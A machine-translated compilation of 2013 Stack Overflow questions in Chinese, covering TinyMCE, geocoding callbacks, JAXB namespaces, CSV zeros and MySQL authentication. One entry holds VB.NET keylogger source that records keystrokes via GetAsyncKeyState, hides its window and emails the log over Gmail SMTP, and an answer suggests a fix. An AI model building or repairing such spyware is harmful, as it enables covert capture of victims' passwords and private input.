我认为这回答了我自己的直接问题，并为其他人提供了一些参考......

谢谢

# php - 用 php 实现 tinymce

> ID：15772441
> 
> 赞同：1
> 
> 时间：2013-04-02T19:15:10.393
> 
> 标签：php, jquery, tinymce

我最近尝试在我的网站中使用 TinyMCE，但问题是通过在 TinyMCE 网站中提到的非常基本的页面中非常简单地实现它，我得到了意想不到的结果。使用以下代码，浏览器仅显示带有保存按钮的大空白区域。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"       
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr">
<head>
<title>TinyMCE Test</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>

<!-- OF COURSE YOU NEED TO ADAPT NEXT LINE TO YOUR tiny_mce.js PATH -->
<script type="text/javascript" src="../jscripts/tiny_mce/tiny_mce.js"></script>

<script type="text/javascript">
tinyMCE.init({
    mode : "textareas"
});
</script>
</head>
<body>
<!-- OF COURSE YOU NEED TO ADAPT ACTION TO WHAT PAGE YOU WANT TO LOAD WHEN HITTING   
"SAVE" -->
<form method="post" action="show.php">
    <p>     
            <textarea name="content" cols="50" rows="15">This is some content that will  
be editable with TinyMCE.</textarea>
            <input type="submit" value="Save" />
    </p>
</form>

</body>
</html> 
```

谁能帮助我代码和浏览器中显示的页面有什么问题。我可以说我使用不同的浏览器得到了相同的结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:56:59.880

请放置所有小`mce` `library`文件，当所有文件都在那里时它会工作。

`tiny mce`请在此处下载最新版本

[http://www.tinymce.com/tryit/full.php](http://www.tinymce.com/tryit/full.php)

# vb.net - 键盘记录器未发送到我的 gmail（仅用于教育目的）

> ID：15772442
> 
> 赞同：-3
> 
> 时间：2013-04-02T19:15:11.567
> 
> 标签：vb.net, keylogger

我一直在试图找出问题所在，但我找不到...

```
Option Strict On Imports System.Web Imports System.IO Imports System.Net.Mail Public Class Form1 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Int32) As Short Private Sub timerKeys_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timerKeys.Tick Dim result As Integer Dim key As String Dim i As Integer For i = 2 To 105 result = 0 result = GetAsyncKeyState(i) If result = -32767 Then key = Chr(i) If 1 = 13 Then key = vbNewLine Exit For End If Next i

    If key <> Nothing Then
        If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
            tbLog.Text &= key
        Else
            tbLog.Text &= key.ToLower

        End If
    End If

    If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso key = "z" Then
        Me.Show()
    End If
End Sub
Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
    Dim smtpServer As New SmtpClient()
    Dim mail As New MailMessage()
    smtpServer.Credentials = New Net.NetworkCredential("example@gmail.com", "passoword")
    'using gmail
    smtpServer.Port = 587
    smtpServer.Host = "smtp.gmail.com"
    smtpServer.EnableSsl = True
    mail = New MailMessage()
    mail.From = New MailAddress("example@gmail.com")
    mail.To.Add("justinecantado@gmail.com")
    mail.From = New MailAddress("example@gmail.com")
    mail.Body = tbLog.Text
    smtpServer.Send(mail)
End Sub 
```

结束类

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:20:28.167

当某些变量超出范围时，某些 smtp 实现不起作用。但是我认为您的问题是您没有指定端口。

# http - 获取热门“#x”搜索词的纯文本列表

> ID：15772444
> 
> 赞同：0
> 
> 时间：2013-04-02T19:15:14.313
> 
> 标签：http, search, post

有没有一个地方我可以找到前 x 个搜索词（最好来自 Google）并通过 HTTP 请求/发布之类的东西导入它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:19:31.237

为此，您需要使用[Google 的自定义搜索 API。](https://developers.google.com/custom-search/v1/overview) 具体来说，您可以使用[num 参数](https://developers.google.com/custom-search/v1/cse/list)告诉它要返回多少个结果。此外， items[].title 将为您提供纯文本的标题， items[].snippet 将为您提供纯文本的片段。

# javascript - 使用 Canvas 和 Html 5 创建类似 Flash 的动画

> ID：15772447
> 
> 赞同：1
> 
> 时间：2013-04-02T19:15:34.827
> 
> 标签：javascript, html, animation, canvas

我最近访问了[http://www.sublimetext.com](http://www.sublimetext.com)，在他们的主页上有一个类似 flash 的动画来代表他们编辑器的功能。我想知道这是否是图像循环？或 gif 或一个小的 .mp4 视频。谁能给我一个基本的了解，我可以如何复制这种功能。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:18:28.913

这里有一篇关于该页面是如何制作的文章[，](http://www.sublimetext.com/~jps/animated_gifs_the_hard_way.html)以及“[编码器](https://github.com/sublimehq/anim_encoder)”的链接。

# jakarta-ee - 来自 Java EE 应用程序的 TCP 套接字连接

> ID：15772450
> 
> 赞同：0
> 
> 时间：2013-04-02T19:15:50.563
> 
> 标签：jakarta-ee, architecture, tcp

我们需要连接到一个外部应用程序，它是一个纯 C/C++ 套接字，最终程序员要求我通过 TCP 打开套接字并连接，所以我的问题

> 从我的 Java EE 应用程序调用 TCP 套接字的最佳方法是什么。

Java EE 应用程序概述：`Struts`+`EJB`

从我的企业应用程序打开套接字是否有任何瓶颈？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:22:26.327

您可以使用[Java Socket](http://docs.oracle.com/javase/6/docs/api/java/net/Socket.html)来完成您的工作。你可以把它放在一个 EJB 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T09:02:30.777

> 从我的 Java EE 应用程序调用 TCP 套接字的最佳方法是什么。

只有一种方法：`java.net.Socket`.

# javascript - 使用 dojo 在 Classic Circular Linear Gauge 中显示当前值

> ID：15772452
> 
> 赞同：0
> 
> 时间：2013-04-02T19:15:56.813
> 
> 标签：javascript, jquery, css, dojo

[是否可以像默认的圆形](http://download.dojotoolkit.org/release-1.8.3/dojo-release-1.8.3/dojox/dgauges/tests/test_Default_CircularLinearGauge.html)线性仪表一样在[经典](http://download.dojotoolkit.org/release-1.8.3/dojo-release-1.8.3/dojox/dgauges/tests/test_Classic_CircularLinearGauge.html)的圆形线性仪表中显示当前值？

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-03T08:45:22.503

将 test_Classic_CircularLinearGauge.html 中的脚本标签更改为：

```
<script type="text/javascript">
    require(["dojo/_base/kernel","dojo/parser","dijit/layout/BorderContainer",
            "dijit/layout/ContentPane",
            "dojox/dgauges/components/classic/CircularLinearGauge"]);
</script> 
```

到：

```
<script type="text/javascript">
    require(["dojo/_base/kernel","dojo/parser","dijit/layout/BorderContainer",
            "dijit/layout/ContentPane",
            "dojox/dgauges/components/classic/CircularLinearGauge"]);

    // ADD THE CURRENT VALUE TO INDICATOR
    require(["dojo/ready","dijit","dojox/dgauges/TextIndicator"],function(
            ready,dijit,TextIndicator){
        ready(function(){
            var gauge=dijit.registry.byId("g1"); // ADAPT THIS TO YOUR GAUGE ID
            indicator=gauge._elementsIndex.scale._indicators[0];
            var indicatorText=new TextIndicator();
            indicatorText.set("indicator",indicator);
            indicatorText.set("x",80);
            indicatorText.set("y",150);
            gauge.addElement("indicatorText",indicatorText);
        });
    });
</script> 
```

这有点脏，很难。更好的方法是从 CircularLinearGauge 创建您自己的类，并在构造函数中添加 TextIndicator ...

# php - 将数字保存为 csv 中的字符串

> ID：15772454
> 
> 赞同：2
> 
> 时间：2013-04-02T19:16:03.667
> 
> 标签：php, csv

我正在尝试将带有前导零的数字的列放入 csv 文件中，但它不断截断前导零，我该怎么做才能保留它们？

这是我正在使用的代码：

```
// fopen() here
function clean_zip($string){
    if(preg_match("/^\d{5,}/", $string)){
        $string = str_pad($string, 5, "0", STR_PAD_LEFT);
    }
    return $string;
}

while(($csv = fgetcsv($rhandle)) !== false){
    // other rows here
    $fcsv[9]  = (string)clean_zip($csv[9]);
    fputcsv($whandle, $fcsv);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-10-16T13:15:58.123

正如评论中已经指出的那样，用双引号 ( `"`) 将数字括起来会导致类似`"0123"`.

方法是添加一个前导单引号 ( `'`)，如文档中所述：

> 如果您决定直接输入数字作为文本，`'`请先输入撇号 ( )。例如，对于列标题中的年份，您可以输入 '1999、'2000 和 '2001。撇号在单元格中不可见，它仅表示该条目将被识别为文本。例如，如果您输入以零 (0) 开头的电话号码或邮政编码，这很有用，因为在正常数字格式中，数字序列开头的零 (0) 会被删除。
> 
> *来源：[将数字格式化为文本](https://help.libreoffice.org/Calc/Formatting_Numbers_as_Text)*

数据现在被解析为字符串，这导致它在函数中被忽略。

另一种方法是将列格式化为文本列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:34:36.847

我只需要告诉 Libre Office 将该列显示为文本列，而不是它认为最适合列/单元格的内容。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-02T19:17:24.337

用双引号字符 (") 括起来。如果您确定只有数字，这很容易——如果字符串中可能有引号，您必须更加小心。

# javascript - Javascript 范围和地理编码

> ID：15772457
> 
> 赞同：0
> 
> 时间：2013-04-02T19:16:04.173
> 
> 标签：javascript, google-maps-api-3, google-geocoder

我整天都在这里寻找可能的帮助，只是一个基本的 noob javascript 错误。

我正在尝试使用谷歌的地理编码器从地址获取纬度/经度。但是，我似乎无法将它分配给全局，甚至无法从对象的属性（我更喜欢）派生它。基本上我现在只需要从地理编码器中获取位置，其他一切都应该到位。见代码：

```
<script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=true&libraries=places"></script>

<script>
    var geocoder = new google.maps.Geocoder();
    var ListingAddress = '1600 Pennsylvania Ave NW  Washington, DC 20500';
    var map;
    var infowindow;

    //var ListingLoc = new google.maps.LatLng(-33.8665433, 151.1956316);
    var ListingLatLong;
    var ListingLoc;

    function initialize() {

        geocoder.geocode({
                address: ListingAddress
                },
                function(results){
                    ListingLatLong = results[0].geometry.location;
                    ListingLoc = new google.maps.LatLng(ListingLatLong);
                });

        map = new google.maps.Map(document.getElementById('map_canvas'), {
            mapTypeId: google.maps.MapTypeId.ROADMAP,
            center: ListingLoc,
            zoom: 15
        });

        var request = {
            location: ListingLoc,
            radius: 500,
            types: ['school']
        };
        infowindow = new google.maps.InfoWindow();
        var service = new google.maps.places.PlacesService(map);
        service.nearbySearch(request, callback);
    }

    function callback(results, status) {
        if (status == google.maps.places.PlacesServiceStatus.OK) {
            for (var i = 0; i < results.length; i++) {
                createMarker(results[i]);
            }
        }
    }

    function createMarker(place) {
        var placeLoc = place.geometry.location;
        var marker = new google.maps.Marker({
            map: map,
            position: place.geometry.location
        });

        google.maps.event.addListener(marker, 'click', function() {
            infowindow.setContent(place.name);
            infowindow.open(map, this);
        });
    }
    google.maps.event.addDomListener(window, 'load', initialize);
</script> 
```

和标记

```
<div id="map_canvas" style="width:600px;height:400px;border:none;"></div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:21:00.663

的第二个参数`geocoder.geocode`是*异步*执行的*回调函数*。这意味着该函数将在您的其余代码*之后的某个时间运行。*因此，在您尝试使用它之前不会为其分配值。**`ListingLatLong`**

 **异步执行是在 JavaScript 中执行网络请求的规范。您无需长时间等待网络往返而导致代码挂起，您只需分派一个请求并定义一个侦听器函数，以便在请求稍后完成时触发。这就是这里发生的事情：函数参数`geocoder.geocode`是一个侦听器函数，一旦数据从 Google 的地理编码服务器到达，就会触发。`geocoder.geocode`确切地说，它并没有运行那个函数——它只是说，“好的，JavaScript，这是一个你应该在我的请求完成时运行的函数。”

**要解决这个问题，只需***在*回调函数中移动任何需要使用`results`(and/or `ListingLatLong`)值的代码：

 *```
 geocoder.geocode({
        address: ListingAddress
        },
        function(results){
            ListingLatLong = results[0].geometry.location;
            ListingLoc = new google.maps.LatLng(ListingLatLong);

            // ** note this is inside the callback now **
            map = new google.maps.Map(document.getElementById('map_canvas'), {
                mapTypeId: google.maps.MapTypeId.ROADMAP,
                center: ListingLoc,
                zoom: 15
            });

            // add the rest of your code here, too
            // ...
        }); 
```

（旁注：你应该只对构造函数使用大写变量名（例如，`var Person = function(name) { this.name = name; }`），对实例使用小写变量名（例如，`someGuy = new Person("Bob");`）。当我看到 name`ListingLatLong`时，我希望它是一个构造函数，但它不是，所以我会建议`listingLatLong`改用。）***

# jquery - 为什么响应状态为 200/OK 时调用 $.ajax() 'error' 函数？

> ID：15772461
> 
> 赞同：1
> 
> 时间：2013-04-02T19:16:23.343
> 
> 标签：jquery, asp.net-web-api, jsonp

我正在尝试使用 JQuery $.ajax() 从我的 WebAPI 中“获取”数据。这是我的代码：

```
$.ajax({
              type: "GET",
              url: "http://localhost:62412/api/RandomData?startTime=2013-02-23%2005%3A00%3A00&callback=?",                                
              dataType: "jsonp",                 
              success: function (data) {
                  alert("success");
              },
              error: function (errorData) {                 
                alert("fail");
              }// When Service call fails
          }); 
```

我可以看到 WebAPI 工作正常并成功返回数据。但在客户端，我总是收到“失败”警报。我可以在萤火虫中看到数据。

谁能告诉我为什么响应状态为“200”时会调用“错误”函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:20:28.887

如果下载的数据不是有效的 json 数据并且可以正确解析，则 $.ajax 调用可能会失败。

更改错误回调并检查错误消息：

```
error: function (data, msg) {                 
            console.log(msg)
          } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:31:56.233

返回的代码不是 JSONP。它是简单的 JSON。

在 jsonp 中，服务器必须将 JSON 对象作为函数的参数返回，并将名称作为回调参数提供。

在您的配置中，如果发送到服务器的回调参数是“示例”，则服务器必须回答

```
example( json code here ) 
```

而不仅仅是

```
json code here 
```

就像现在一样。

使用该`$.ajax`函数，您不必在客户端指定回调函数名称，但服务器必须遵守它。

# xml - 使用 loadXMLByURL 发送 API 密钥

> ID：15772464
> 
> 赞同：0
> 
> 时间：2013-04-02T19:16:31.227
> 
> 标签：xml, api-key

我刚开始使用 iOS，所以提前感谢您的耐心等待。我需要将我的 API 密钥与我的 XML 请求一起发送，以便访问所需的数据。我可以使用与创建解析器相同的方法吗？

首先，在我的 XMLParser.m 中：

```
-(id) loadXMLByURL:(NSString *)urlString
{
    _matchups = [[NSMutableArray alloc] init];
    NSURL *url = [NSURL URLWithString:urlString];
    NSData *data = [[NSData alloc] initWithContentsOfURL:url];
    parser = [[NSXMLParser alloc] initWithData:data];
    parser.delegate = self;
    [parser parse];

    return self;
 } 
```

接下来，在我的 ViewController.m 中：

```
- (void)viewDidLoad
{
   [super viewDidLoad];

   NSLog(@"About to retrieve matchups");
   xmlParser = [[XMLParser alloc]            
   loadXMLByURL:@"http://www.xxxxxxxx.com/ss/GetHistoricMatchesByLeagueAndSeason.xml"];

   self.title = @"Matchups";
} 
```

该 URL 已删除，因为我保存并上传了一个示例 XML 到我的个人网站以完成我的解析器，然后再继续使用 API 密钥。这将被 asmx 取代。

理想情况下，我想以最安全的方法发送 API 密钥。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-14T17:54:22.047

我目前正在开发一个发送应用程序密钥以获取 XML 的应用程序。它在我的应用程序中完成的方式是这样的：

```
 // get events with the API from so&so.com
    xmlParser = [[XMLParser alloc] loadXMLByURL:@"https://www.so&so.com/xml/organizer_list_events?app_key=PNZJKTEM6V4CQdhksUD&id=89019hhx55"]; 
```

所有这些信息都可以在网站 API 部分找到。我希望这有帮助

# asp.net-web-api - Breeze 元数据的 JSON 解析错误

> ID：15772466
> 
> 赞同：2
> 
> 时间：2013-04-02T19:16:34.017
> 
> 标签：asp.net-web-api, breeze, durandal, hottowel

我刚刚将 Breeze nuget 包从 1.1.3 升级到 1.2.7。我的一些具有“ComplexType”项目的类出现错误，因此升级后从 MVC4 Web API 读取元数据时出现以下错误。在那之前，除了 ComplexType，一切都正常工作，所以我确定一切都到位，因为我正在获取元数据，并且能够在屏幕上显示数据。

```
Uncaught SyntaxError: Unexpected token o 

Uncaught SyntaxError: Unexpected token o breeze.debug.js:12561
ctor.fetchMetadata.ajaxImpl.ajax.success breeze.debug.js:12561
jQuery.Callbacks.fire jquery-1.9.1.js:1037
jQuery.Callbacks.self.fireWith jquery-1.9.1.js:1148
done jquery-1.9.1.js:8074
jQuery.ajaxTransport.send.callback 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T19:46:37.397

我遇到了完全相同的问题，我注意到当您针对元数据位置（/api/Context/Metadata）发出 GET 时，它返回了一个格式为 json 的 xml 文档。我也认为有一个相关的[问题](https://stackoverflow.com/questions/14494117/breeze-metadata-appears-in-xml-format)，但情况略有不同。然而，在这种情况下，错误是在`ctor.prototype.fetchMetadata`包含`JSON.parse()`. 但我很确定是完全相同的根本原因。

只需从 Nuget 更新 Breeze（包括 dll 和 js 文件）就可以了。请注意，您可能必须从`/Scripts`文件夹中手动删除微风文件。

# mysql - sql插入中的单引号和双引号

> ID：15772468
> 
> 赞同：0
> 
> 时间：2013-04-02T19:16:51.943
> 
> 标签：mysql, sql, double, quotes

我在使用 mySQL 时遇到了一个问题。我有一个带有零件编号和描述的零件表。我正在尝试插入一千多个部分，并且需要使格式适用于每个插入。对于某些部分，描述（文本类型）将类似于：

TUBE 1/2" X .049" 未阳极氧化 6061 T6 12'

我尝试了多种引号组合，但由于它使用单引号和双引号，因此将其作为文本插入真的很痛苦。我怎样才能做到这一点，以便它适用于所有插入，即使是那些没有任何特殊字符的插入？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:24:57.313

使用反斜杠转义符号：'TUBE 1/2\" X .049\" UNANODIZED'

我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:26:41.863

每次使用单引号或双引号时，请使用反斜杠字符对其进行转义 TUBE 1/2\" X .049\" UNANODIZED 6061 T6 12\'

# actionscript-3 - 当 mouseX = 0 时，AS3 鼠标事件未触发

> ID：15772473
> 
> 赞同：3
> 
> 时间：2013-04-02T19:17:03.187
> 
> 标签：actionscript-3, flash, mouseevent, mousedown, mouseup

我正在 Flash Develop 中创建*一个*非常简单的全屏拖放游戏。除了在一个令人沮丧的情况下，它工作正常。

我将项目添加到舞台，向它们添加 MOUSE_DOWN 侦听器，并在听到该侦听器时开始拖动。然后我添加一个 MOUSE_UP 侦听器来确定何时停止拖动。同样，除非 mouseX = 0，否则这工作正常。当鼠标一直位于屏幕左侧并且我鼠标向上或向下时，不会触发任何侦听器。我还把它从全屏模式中取出，如果鼠标处于或低于 0，则不会触发鼠标事件。

世界上到底发生了什么？

```
 private function itemSelectedHandler(e:MouseEvent):void 
    {
        thisItem = GameItem(e.currentTarget);
        thisItem.startDrag();
        stage.addEventListener(MouseEvent.MOUSE_UP, itemUnselectedHandler, false, 0, true);
    }

    private function itemUnselectedHandler(e:MouseEvent):void 
    {
        stopDrag();
        stage.removeEventListener(MouseEvent.MOUSE_UP, itemUnselectedHandler);
        thisItem.removeEventListener(MouseEvent.MOUSE_DOWN, itemSelectedHandler);   
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:24:48.813

您在类上调用 stopDrag 而不是拖动的精灵。尝试以下操作：

```
package 
{
    public class Main extends Sprite 
    {

        private var _draggedSprite:Sprite = null;

        public function Main():void 
        {
            if (stage) init();
            else addEventListener(Event.ADDED_TO_STAGE, init);
        }

        private function init(e:Event = null):void 
        {
            removeEventListener(Event.ADDED_TO_STAGE, init);
            // entry point

            for (var i:int = 0; i < 10; i++) 
            {
                createBox();
            }
        }

        private function createBox():void
        {
            var sp:Sprite = new Sprite();
            sp.graphics.beginFill(0xff0000, 1);
            sp.graphics.drawRect(0, 0, 30, 30);
            sp.graphics.endFill();
            sp.addEventListener(MouseEvent.MOUSE_DOWN, onMouseDown);

            sp.x = Math.random() * (stage.stageWidth - 30);
            sp.y = Math.random() * (stage.stageHeight - 30);

            addChild(sp);
        }

        private function onMouseDown(e:MouseEvent):void 
        {
            var sp:Sprite = e.target as Sprite;
            sp.startDrag();
            _draggedSprite = sp;

            stage.addEventListener(MouseEvent.MOUSE_UP, onMouseUp);
        }

        private function onMouseUp(e:MouseEvent):void 
        {
            _draggedSprite.stopDrag();
            _draggedSprite = null;
            stage.removeEventListener(MouseEvent.MOUSE_UP, onMouseUp);
        }

    }

} 
```

当 mouseX=0 在全屏模式下时，这对我有用。

# java - servlet转发后的Spring重定向未传递模型

> ID：15772477
> 
> 赞同：0
> 
> 时间：2013-04-02T19:17:15.717
> 
> 标签：java, spring, jakarta-ee, tomcat, servlets

我有一个将 Spring 控制器与几个常规 servlet 组合在一起的 Portal。

在屏幕中，用户有一个列表，他/她从该列表中选择一张信用卡，以便查看该卡的交易报告。作为一项额外的安全措施，我避免在任何请求中向客户发送信用卡，因此我有一个隐藏的信用卡号码列表，我发送给用户，并且在用户发送的请求中，我收到了我使用的记录 ID以确定正在查询的信用卡。

在控制器（**ReportController**）中，我有一个方法来处理此输入并（本地）调用负责处理报告的 servlet（**ReportServlet**）。*如果处理中有任何错误，它应该使用模型*参数“ *error* ”将其返回到屏幕。最后一部分不起作用。

**如果ReportServlet**中有错误，则不会将其返回到屏幕。如果我评论转发线（并强制出错）它可以工作，但在转发之后它不会。我做错了什么？

这是代码：

**报告控制器**

```
try {
               ...

                if (cardholders == null || cardholders.size() < 2 || id <= 0) {
                    model.put("error","there's an error");
                    return CARDTRANSACTIONS_PATH;
                } else {
...
                    HttpUpdatetableRequestWrapper customRequest = new HttpUpdatetableRequestWrapper(request);
                    customRequest.setParameter("cardnumber", cardholder.getCardnumber());

                    request.getRequestDispatcher(config.getProperty("reportservlet")).forward((HttpServletRequest) customRequest, response);
                    String error = (String) session.getAttribute("error");
                    if(!(error == null || "".equals(error))){
                        throw new RuntimeException(error);                        
                    }
                }
            } catch (Exception ex) {
                model.put("error", "there's an error");
            } finally{ return CARDTRANSACTIONS_PATH;} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:28:23.250

当您的控制器返回时，Spring 会将模型交给一个[`AbstractView`](http://static.springsource.org/spring/docs/1.2.9/api/org/springframework/web/servlet/view/AbstractView.html)将分解它并将属性传递给请求的模型。因此，当您向控制器中的模型对象添加属性时，您只是将它们添加到与请求无关的映射中。如果您希望这些属性可用于您转发到的资源，您应该将它们直接添加到请求中。

当你转发时，你期望你转发到的资源来处理响应，所以你应该让你的控制器`null`在那种情况下返回，这样它就不会做任何进一步的处理。

# java - Jaxb：在同一个包中解组具有多个命名空间的 xml

> ID：15772478
> 
> 赞同：18
> 
> 时间：2013-04-02T19:17:17.990
> 
> 标签：java, xml, namespaces, jaxb, annotations

我是在 xml 中使用命名空间的新手，所以我有点困惑，想澄清一下。我有一个 java 服务，我在其中接收具有许多不同名称空间的 xml 文档，当我让它工作时，我觉得我一定做错了什么，所以我想检查一下。在我的 package-info.java 我有我的模式注释，例如：

```
@javax.xml.bind.annotation.XmlSchema(
    xmlns={
        @javax.xml.bind.annotation.XmHS(prefix="train", namespaceURI="http://mycompany/train"), 
        @javax.xml.bind.annotation.XmHS(prefix="passenger", namespaceURI="http://mycompany/passenger")
    }, 
    elementFormDefault = javax.xml.bind.annotation.XmlNsForm=QUALIFIED
) 
```

我有一个在类级别注释的 Train.java：

```
@XmlRootElement(name="Train", namespace="http://mycompany/train") 
```

并且类中的每个字段都用以下注释：

```
@XmlElement(name="Color") for example 
```

火车包含一个乘客列表，所以有一个属性

```
private Set<Passenger> passengers; 
```

并且此集合注释为：

```
@XmlElementWrapper(name="Passengers")
@XmlElements(@XmlElement(name="Passenger", namespace="http://mycompany/passenger")) 
```

然后在Passenger.java中，类本身被注释：

```
@XmlElement(name="Passenger", namespace="http://mycompany/passenger") 
```

最后，对于Passenger.java 中的各个字段，它们的注释如下：

```
@XmlElement(name="TicketNumber", namespace="http://mycompany/passenger") 
```

所以当我有一个看起来像这样的xml时：

```
<train:Train>
   <train:Color>Red</train:Color>
   <train:Passengers>
       <train:Passenger>
           <passenger:TicketNumber>T101</passenger:TicketNumber>
       </train:Passenger>
   </train:Passengers>
</train:Train> 
```

现在我解组收到的这个 xml，并设置了 Train 的 Color 属性和Passenger 的 TicketNumber 属性。但我不知道为什么我需要在 TicketNumber 上的 XmlElement 注释上添加命名空间 url 才能工作，但我不需要为 Train 上的 Color 属性这样做。如果我从 TicketNumber 上的 XmlElement 注释中删除命名空间属性，则 xml 中的值不会映射到对象，除非我也从 xml 请求中删除命名空间前缀。我觉得因为我已经在 XmlRootElement 上为乘客定义了命名空间属性，所以我不需要为类中的每个字段都这样做，就像我不需要为火车一样，所以我假设我一定是设置有问题。有人可以指出我正确的方向吗？谢谢！

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-02T19:45:51.067

以下是基于您的模型在[**JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222)中命名空间如何工作的解释。

**JAVA模型**

**包信息**

以下是您的`@XmlSchema`注释的修改版本。它包含一些关键信息：

*   `namespace`- 默认命名空间将用于限定未指定另一个命名空间的全局元素（对应于`@XmlRootElement`和`@XmlElementDecl`注释的那些（以及基于值的本地元素）。`elementFormDefault`
*   `elementFormDefault`默认情况下，只有全局元素是命名空间限定的，但通过将值设置为`XmlNsForm.QUALIFIED`所有未指定显式命名空间的元素将使用该`namespace`值限定。
*   `xmlns`是 JAXB impl 应该为这些命名空间使用的首选前缀集（尽管它们可能使用其他前缀）。

```
@XmlSchema(
    namespace="http://mycompany/train",
    elementFormDefault = XmlNsForm.QUALIFIED,
    xmlns={
       @XmlNs(prefix="train", namespaceURI="http://mycompany/train"), 
       @XmlNs(prefix="passenger", namespaceURI="http://mycompany/passenger")
   }
)
package forum15772478;

import javax.xml.bind.annotation.*; 
```

**火车**

由于`Train`类对应的所有元素都对应注解`namespace`上的指定，所以`@XmlSchema`我们不需要指定任何命名空间信息。

*   全局元素 -`@XmlRootElement`注释对应于全局元素。
*   本地元素 -`@XmlElementWrapper`和`@XmlElement`注释对应于本地元素。

```
package forum15772478;

import java.util.List;
import javax.xml.bind.annotation.*;

@XmlRootElement(name="Train")
public class Train {

    private List<Passenger> passengers;

    @XmlElementWrapper(name="Passengers")
    @XmlElement(name="Passenger")
    public List<Passenger> getPassengers() {
        return passengers;
    }

    public void setPassengers(List<Passenger> passengers) {
        this.passengers = passengers;
    }

} 
```

**乘客**

如果类上的属性对应的所有元素`Passenger`都将在`http://mycompany/passenger`命名空间中，那么您可以使用该`@XmlType`注解来覆盖`namespace`该`@XmlSchema`注解。

```
package forum15772478;

import javax.xml.bind.annotation.*;

@XmlType(namespace="http://mycompany/passenger")
public class Passenger {

    private String ticketNumber;

    @XmlElement(name="TicketNumber")
    public String getTicketNumber() {
        return ticketNumber;
    }

    public void setTicketNumber(String ticketNumber) {
        this.ticketNumber = ticketNumber;
    }

} 
```

或者，您可以在属性级别覆盖命名空间。

```
package forum15772478;

import javax.xml.bind.annotation.*;

public class Passenger {

    private String ticketNumber;

    @XmlElement(
        namespace="http://mycompany/passenger",
        name="TicketNumber")
    public String getTicketNumber() {
        return ticketNumber;
    }

    public void setTicketNumber(String ticketNumber) {
        this.ticketNumber = ticketNumber;
    }

} 
```

**演示代码**

可以运行以下演示代码来证明一切正常：

**演示**

```
package forum15772478;

import java.io.File;
import javax.xml.bind.*;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Train.class);

        Unmarshaller unmarshaller = jc.createUnmarshaller();
        File xml = new File("src/forum15772478/input.xml");
        Train train = (Train) unmarshaller.unmarshal(xml);

        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.marshal(train, System.out);
    }

} 
```

**输入.xml/输出**

在下面的 XML 中，我添加了您问题中的 XML 文档中缺少的必要名称空间声明。

```
<train:Train 
   xmlns:train="http://mycompany/train" 
   xmlns:passenger="http://mycompany/passenger">
   <train:Color>Red</train:Color>
   <train:Passengers>
       <train:Passenger>
           <passenger:TicketNumber>T101</passenger:TicketNumber>
       </train:Passenger>
   </train:Passengers>
</train:Train> 
```

**了解更多信息**

*   [http://blog.bdoughan.com/2010/08/jaxb-namespaces.html](http://blog.bdoughan.com/2010/08/jaxb-namespaces.html)

# c# - 不再支持使用旧密码进行身份验证，请使用 4.1 样式密码

> ID：15772479
> 
> 赞同：21
> 
> 时间：2013-04-02T19:17:20.847
> 
> 标签：c#, mysql, authentication

我的网站带有 hostgator，我想使用 C# windows 应用程序访问 mysql 数据库，但是当我尝试连接时收到此消息：

> “不再支持使用旧密码进行身份验证，请使用 4.1 样式密码”

我试过给定的解决方案：

```
SET SESSION old_passwords=0;
SET PASSWORD FOR user@host=PASSWORD('your pw here'); 
```

第一个查询成功执行，但在执行第二个查询时出现错误“用户@主机的访问被拒绝”。我不明白为什么会出现这个问题。我正在使用 MySQL-connecter-net 6.6.5。

我成功地将我的数据库与 MySql 工作台 5.2.47 连接起来。

任何人都可以帮助我做更多的事情吗？

* * *

我已经联系了我的托管站点，他们对 my.cnf 文件进行了更改以使用 4.1 样式的密码。我可以连接mysql

```
mysql -u <username> -p <password> -h <hostname>; 
```

但是当我尝试使用 mySQL 连接器 net 6.6.5 连接 C# 时，我再次遇到此错误。

我在 Windows 8 64 位上使用带有 MySQL 连接器 6.6.5 的 Visual Studio 2012。这是我用来连接的代码

```
using MySQL.Data.MySQLClient;

private void button1_Click(object sender, EventArgs e)
            {
                string connStr = String.Format("server={0};port={1};uid={2};password={3};database={4}",
                    txtserver.Text, txtPort.Text, txtUser.Text, txtPassword.Text, txtDatabase.Text);
                conn = new MySqlConnection(connStr);
